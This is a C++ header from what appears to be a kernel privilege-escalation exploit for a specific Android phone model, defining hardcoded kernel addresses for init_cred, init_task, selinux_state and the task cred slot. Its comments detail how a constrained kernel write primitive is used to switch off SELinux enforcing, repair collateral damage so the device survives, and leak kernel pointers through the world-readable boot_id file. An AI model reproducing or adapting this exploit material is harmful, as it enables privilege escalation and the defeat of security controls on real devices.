//
// Created by Anakin on 2026-10-31.
//

#ifndef ROOT_OPLUS_ACE5_ALIASES_H
#define ROOT_OPLUS_ACE5_ALIASES_H

#include <cstdint>

// Physical aliases of kernel-image addresses:
//   data_addr(X) = 0xffffff8000000000 + (X - 0xffffffc008000000)
// KASLR-independent; verified across five distinct _text values.
static constexpr uint64_t KIMAGE_TEXT_BASE = 0xffffffc008000000ULL;
static constexpr uint64_t LINEAR_MAP_BASE  = 0xffffff8000000000ULL;

static constexpr uint64_t AL_INIT_CRED = 0xffffff8002052068; // init_cred
static constexpr uint64_t AL_INIT_TASK = 0xffffff800203fc00; // init_task

// _printk_rb_static_infos + 0x4000. dmesg is ~2 MB while __LOG_BUF_LEN is
// 128 KB, so printk uses a dynamically allocated ring and this static array is
// never touched -- an all-zero 0x40-byte slot is a valid unlocked rt_mutex with
// an empty waiters tree and owner == NULL, which is exactly the shape the
// post-erase reinsert and the owner<=1 early exit need.
static constexpr uint64_t AL_ZERO_LOCK     = 0xffffff8002075458;
static constexpr int      ZERO_LOCK_STRIDE = 0x40;

// selinux_state is at image 0xffffffc00a27d0a8; BTF gives enforcing at +0x000,
// checkreqprot +0x001, initialized +0x002, policycap[8] +0x003, and
// status_page/avc/policy at +0x010 and beyond. The erase stores VALUE's eight
// bytes verbatim at TARGET, so writing enforcing necessarily overwrites the two
// other _Bool fields and policycap[0..4].
//
// A canonical _Bool must be 0 or 1. This kernel is built +pgo +bolt +lto -mlgo
// and reads `initialized` with a != 1 test, so a VALUE whose byte 2 is 8 makes
// selinux_setprocattr return EINVAL: zygote aborts on every app spawn and
// system_server crash-loops (measured: `service list` empty, libselinux logs
// "Error setting context for app ...: Invalid argument").
//
// Forcing byte0=0, byte1=0, byte2=1 pins VALUE to image offset 0xXX010000, and
// all four XX values are unusable: 0x00 is _stext, 0x01 is .text (pKVM nVHE),
// 0x02 is the percpu template that free_initmem returns to the buddy allocator,
// 0x03 is past _end. So stage 1 is two writes: flip enforcing, then repair
// `initialized` with a second, deliberately unaligned store at +2 (arm64
// tolerates it, and VALUE & ~3 keeps the erase's other two accesses aligned
// inside the unused printk window). policycap[0..5] staying non-zero is proven
// harmless: the framework recovered with all of them set.
static constexpr uint64_t AL_SELINUX_STATE = 0xffffff800227d0a8;
static constexpr uint64_t AL_SELINUX_VALUE = 0xffffff8002080000; // byte0 -> enforcing = 0
static constexpr uint64_t AL_SELINIT_STATE = 0xffffff800227d0aa; // selinux_state + 2
// byte0 (=initialized) must be 1, and (VALUE & ~3) — the erase's parent,
// which receives the collateral TARGET store at +0x10 — must land INSIDE the
// unused infos window [AL_ZERO_LOCK, +0x54000). The old value 0x...2070001
// had parent 0x2070000 inside _printk_rb_static_descs — the LIVE dmesg
// ring: the collateral corrupted a live prb_desc and printk killed the
// kernel during the following round (measured 60-70% crash at stage1b).
// 0x2075501: parent 0x2075500 is inside the window; policycap[0..1] get
// 0x55/0x07 (non-zero policycaps are proven harmless).
static constexpr uint64_t AL_SELINIT_VALUE = 0xffffff8002075501;

// Static sysctl boot_id string data (r5x-measured on this device; the
// alias window is kaslr-independent). World-readable back channel for
// page-liveness probes: a constrained write here shows up verbatim in
// /proc/sys/kernel/random/boot_id.

// init_task.tasks list head: the r56 A-write uses exactly this address as
// its pc (MAIN_WRITE_VALUE), which is how the tasks-list pointers land in
// boot_id; the repair write targets it with the decoded prev.
static constexpr uint64_t AL_TASKS_NEXT = AL_INIT_TASK + 0x550;

static constexpr int OFF_CRED_SLOT = 0x838;  // task_struct->cred

// The first chain walk takes lock->wait_lock and releases it again on the
// owner<=1 exit, so re-walking one slot is safe. But rb_add_cached leaves the
// waiter pointer in lock->waiters, which outlives the process that painted it,
// so every fire takes a fresh slot and no two processes may share one -- see
// next_slot_base() in root_stage.cpp. A round consumes [base, base+MAX_GEN+1].
static constexpr int ZERO_LOCK_MAX_GEN = 64;

#endif //ROOT_OPLUS_ACE5_ALIASES_H
